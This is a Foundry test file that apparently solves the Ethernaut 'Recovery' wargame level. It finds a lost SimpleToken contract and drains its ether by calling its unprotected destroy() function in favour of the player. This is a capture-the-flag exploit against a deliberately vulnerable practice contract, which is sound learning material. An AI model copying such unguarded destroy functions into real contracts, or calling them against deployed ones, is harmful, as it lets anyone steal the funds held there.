// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "./Recovery.sol";

contract test_solution is Test {
    Recovery level;
    SimpleToken lostcontract;
    address player = makeAddr("player");
    address deployer = makeAddr("deployer");

    function setUp() public {
        Recovery _level = new Recovery();
        level = Recovery(payable(address(_level)));

        vm.deal(player, 1 ether);
        vm.deal(deployer, 1 ether);
    }

    function test_recovery() public {
        vm.startPrank(deployer);
        SimpleToken _simpletoken = SimpleToken(payable((level.generateToken("ttt", 10000))));
        lostcontract = SimpleToken(_simpletoken);
        assertEq(lostcontract.balances(deployer), 10000);
        address(lostcontract).call{value: 0.001 ether}(""); // deployer sends 0.001 ether for extra
        assertEq((lostcontract.balances(deployer) == 0.01 ether + 10000), false); // as the balances override the previous value
        vm.stopPrank();

        vm.startPrank(player);
        assertEq(lostcontract.balances(deployer), 0.01 ether);
        assertEq((address(lostcontract).balance), 0.001 ether);

        lostcontract.destroy(payable(player));
        assertEq(address(level).balance, 0);
        vm.stopPrank();
    }
}
